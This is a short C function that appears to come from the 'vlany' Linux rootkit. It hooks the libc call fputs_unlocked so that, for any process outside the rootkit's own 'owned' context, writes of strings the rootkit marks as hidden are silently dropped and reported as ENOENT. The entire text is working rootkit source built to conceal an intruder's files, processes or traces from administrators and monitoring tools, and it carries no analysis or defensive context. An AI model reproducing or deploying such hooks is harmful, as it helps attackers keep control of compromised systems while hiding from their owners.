int fputs_unlocked(const char *s, FILE *stream)
{
    #ifdef DEBUG
        printf("[vlany] fputs_unlocked() called\n");
    #endif

    HOOK(old_fputs_unlocked, CFPUTS_UNLOCKED);

    if(owned()) return old_fputs_unlocked(s, stream);

    if(hidden_str(s)) { errno = ENOENT; return -1; }

    return old_fputs_unlocked(s, stream);
}
